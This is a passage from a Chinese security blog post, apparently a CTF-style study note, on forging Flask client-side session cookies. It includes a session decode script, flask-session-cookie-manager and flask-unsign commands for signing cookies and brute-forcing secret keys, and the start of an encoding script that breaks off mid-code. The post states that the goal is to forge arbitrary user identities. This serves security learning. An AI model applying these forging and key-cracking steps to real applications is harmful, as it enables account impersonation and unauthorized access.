<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Python Session伪造 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='代码审计, python安全' />
  <meta itemprop="name" content="python session伪造">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="540">
  <meta itemprop="keywords" content="代码审计,Python安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/31/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="python session伪造">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="代码审计">
    <meta property="article:tag" content="Python安全">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="python session伪造">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/31/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/32/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/30/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "python session伪造",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/python\/python%E5%AE%89%E5%85%A8\/31\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, python安全","wordcount":  540 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/python\/python%E5%AE%89%E5%85%A8\/31\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Python Session伪造</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Python Session伪造</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="540 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>这一块一直不咋熟悉，貌似在flask中session伪造比较多，学一下</p>
<blockquote>
<p>并不是所有语言都有像php那样的的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。</p>
<p>因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。</p>
</blockquote>
<p><strong>flask</strong> 的 <strong>session</strong> 机制：<a href="http://cizixs.com/2017/03/08/flask-insight-session/"target="_blank" rel="external nofollow noopener noreferrer">flask 源码解析：session</a></p>
<p>客户端 <strong>session</strong>问题：<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html"target="_blank" rel="external nofollow noopener noreferrer">客户端 session 导致的安全问题</a></p>
<p>flask仅对 <strong>session</strong> 进行了签名，按照flask对session的处理，如果我们拿不到secret_key也就无法伪造session</p>
<p>此外众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题，比如敏感信息泄露。</p>
<h5 id="加密解密" class="heading-element"><span>0.0.0.1  加密解密</span>
  <a href="#%e5%8a%a0%e5%af%86%e8%a7%a3%e5%af%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><p><code>flask解密脚本</code></p>
<p>通过这个脚本解密处 <strong>session</strong> ，我们就可以大概知道 <strong>session</strong> 中存储着哪些基本信息。然后我们可以通过其他漏洞获取用于签名认证的 <strong>secret_key</strong> ，进而伪造任意用户身份，扩大攻击效果。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">sys</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">zlib</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">base64</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">b64decode</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">flask.sessions</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">session_json_serializer</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">itsdangerous</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">base64_decode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">decryption</span>(<span style="color:#58a1dd">payload</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">payload</span>, <span style="color:#58a1dd">sig</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">rsplit</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;.&#39;</span>, <span style="color:#a6be9d">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">payload</span>, <span style="color:#58a1dd">timestamp</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">rsplit</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;.&#39;</span>, <span style="color:#a6be9d">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">decompress</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">startswith</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;.&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span>[<span style="color:#a6be9d">1</span>:]
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">decompress</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">base64_decode</span>(<span style="color:#58a1dd">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#39;Could not base64 decode the payload because of &#39;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6be9d">&#39;an exception&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">decompress</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">zlib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decompress</span>(<span style="color:#58a1dd">payload</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#39;Could not zlib decompress the payload before &#39;</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#a6be9d">&#39;decoding the payload&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">session_json_serializer</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">payload</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">decryption</span>(<span style="color:#a6be9d">&#34;eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XyZ3Vw.OcD3-l1yOcq8vlg8g4Ww3FxrhVs&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">encode</span>()))</span></span></code></pre></div><p><code>flask加密脚本</code></p>
<p><a href="https://github.com/noraj/flask-session-cookie-manager"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/noraj/flask-session-cookie-manager</a></p>
<ul>
<li>
<p><code>编码</code></p>
<blockquote>
<p>python3 flask_session_cookie_manager3.py encode -s &ldquo;woshicaiji&rdquo; -t &ldquo;{&lsquo;username&rsquo;: b&rsquo;admin&rsquo;}&rdquo;</p>
<p>usage: flask_session_cookie_manager{2,3}.py encode [-h] -s <!-- raw HTML omitted --> -t <!-- raw HTML omitted --></p>
<p>optional arguments:
-h, &ndash;help            show this help message and exit
-s <!-- raw HTML omitted -->, &ndash;secret-key <!-- raw HTML omitted -->
Secret key
-t <!-- raw HTML omitted -->, &ndash;cookie-structure <!-- raw HTML omitted -->
Session cookie structure</p>
</blockquote>
</li>
<li>
<p><code>解码</code></p>
<blockquote>
<p>python3 ./flask_session_cookie_manager3.py decode -c &ldquo;.eJw9kE2LwjAURf_K8NYuajqzEVwIsaXCS1FiQ7IRdWrz0ThDW6mN-N8nOODqLe7hXO57wOHS1b2GxdDd6hkczDcsHvBxggWg3afIi7u05wnJNjCSOZVnjuWVRt46DNpJIe-KKqf4NjKSSK4Ns-cRvYrcRjO6JyVtDYZiYl4GJJmJ1BxtcS8FkngnyXFUNjMql1_SrlImMJT0RaeRmLO8-FTcTcpiUvKdVnRN0FemzCPDWx37lvCcwbnvLofhx9XX9wTpN7YUqmWxUorKKrsakTdBBu2V2BhGK8dEnCiimq5TZldENsuXzvhjU79Nu-SX7sf_5Hr0MYCh7geYwa2vu9fbYJ7A8w-kYW1v.Xj-tXQ.GmXzuYTP0IobbVCyI-9xVsc5C5A&rdquo; -s ckj123</p>
<p>usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s <!-- raw HTML omitted -->] -c <!-- raw HTML omitted --></p>
<p>optional arguments:
-h, &ndash;help            show this help message and exit
-s <!-- raw HTML omitted -->, &ndash;secret-key <!-- raw HTML omitted -->
Secret key
-c <!-- raw HTML omitted -->, &ndash;cookie-value <!-- raw HTML omitted -->
Session cookie value</p>
</blockquote>
</li>
</ul>
<h5 id="密钥爆破" class="heading-element"><span>0.0.0.2  密钥爆破</span>
  <a href="#%e5%af%86%e9%92%a5%e7%88%86%e7%a0%b4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><p>安装
<code> pip3 install flask-unsign</code></p>
<p>安装字典</p>
<p><code>pip install flask-unsign[wordlist]</code></p>
<p>命令行就可以直接使用<code> flask-unsign</code></p>
<p>加密</p>
<pre tabindex="0"><code>flask-unsign --sign --cookie &#34;{&#39;_permanent&#39;: True, &#39;username&#39;: &#39;st4ck&#39;}&#34; --secret &#34;secret&#34; 
eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4</code></pre><p>解密+爆破key</p>
<pre tabindex="0"><code>flask-unsign --unsign --cookie  &#34;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.ZILbKw.nP0y-ckRmsBnczLXQfz3xuvZvgc&#34;</code></pre><p>另外也可以使用脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">sys</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">zlib</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">itsdangerous</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">base64_decode</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">ast</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Abstract Base Classes (PEP 3119)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">sys</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">version_info</span>[<span style="color:#a6be9d">0</span>] <span style="color:#ff636f">&lt;</span> <span style="color:#a6be9d">3</span>: <span style="color:#828b96;font-style:italic"># &lt; 3.0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#39;Must be using at least Python 3&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff636f">elif</span> <span style="color:#58a1dd">sys</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">version_info</span>[<span style="color:#a6be9d">0</span>] <span style="color:#ff636f">==</span> <span style="color:#a6be9d">3</span> <span style="color:#ff636f">and</span> <span style="color:#58a1dd">sys</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">version_info</span>[<span style="color:#a6be9d">1</span>] <span style="color:#ff636f">&lt;</span> <span style="color:#a6be9d">4</span>: <span style="color:#828b96;font-style:italic"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">from</span> <span style="color:#58a1dd">abc</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">ABCMeta</span>, <span style="color:#58a1dd">abstractmethod</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">else</span>: <span style="color:#828b96;font-style:italic"># &gt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">from</span> <span style="color:#58a1dd">abc</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">ABC</span>, <span style="color:#58a1dd">abstractmethod</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Lib for argument parsing</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">argparse</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### external Imports</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">flask.sessions</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">SecureCookieSessionInterface</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">MockApp</span>(<span style="color:#58a1dd">object</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">def</span> <span style="color:#58a1dd">__init__</span>(<span style="color:#58a1dd">self</span>, <span style="color:#58a1dd">secret_key</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">self</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">secret_key</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">secret_key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">sys</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">version_info</span>[<span style="color:#a6be9d">0</span>] <span style="color:#ff636f">==</span> <span style="color:#a6be9d">3</span> <span style="color:#ff636f">and</span> <span style="color:#58a1dd">sys</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">version_info</span>[<span style="color:#a6be9d">1</span>] <span style="color:#ff636f">&lt;</span> <span style="color:#a6be9d">4</span>: <span style="color:#828b96;font-style:italic"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">class</span> <span style="color:#58a1dd">FSCM</span>(<span style="color:#58a1dd">metaclass</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">ABCMeta</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">def</span> <span style="color:#58a1dd">encode</span>(<span style="color:#58a1dd">secret_key</span>, <span style="color:#58a1dd">session_cookie_structure</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#a6be9d">&#34;&#34;&#34; Encode a Flask session cookie &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">app</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">MockApp</span>(<span style="color:#58a1dd">secret_key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">session_cookie_structure</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">ast</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">literal_eval</span>(<span style="color:#58a1dd">session_cookie_structure</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">si</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">SecureCookieSessionInterface</span>()
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">si</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get_signing_serializer</span>(<span style="color:#58a1dd">app</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">session_cookie_structure</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#a6be9d">&#34;[Encoding error] </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">e</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">e</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">def</span> <span style="color:#58a1dd">decode</span>(<span style="color:#58a1dd">session_cookie_value</span>, <span style="color:#58a1dd">secret_key</span><span style="color:#ff636f">=</span><span style="color:#ff636f">None</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#a6be9d">&#34;&#34;&#34; Decode a Flask cookie  &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">secret_key</span><span style="color:#ff636f">==</span><span style="color:#ff636f">None</span>):
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">compressed</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">False</span>
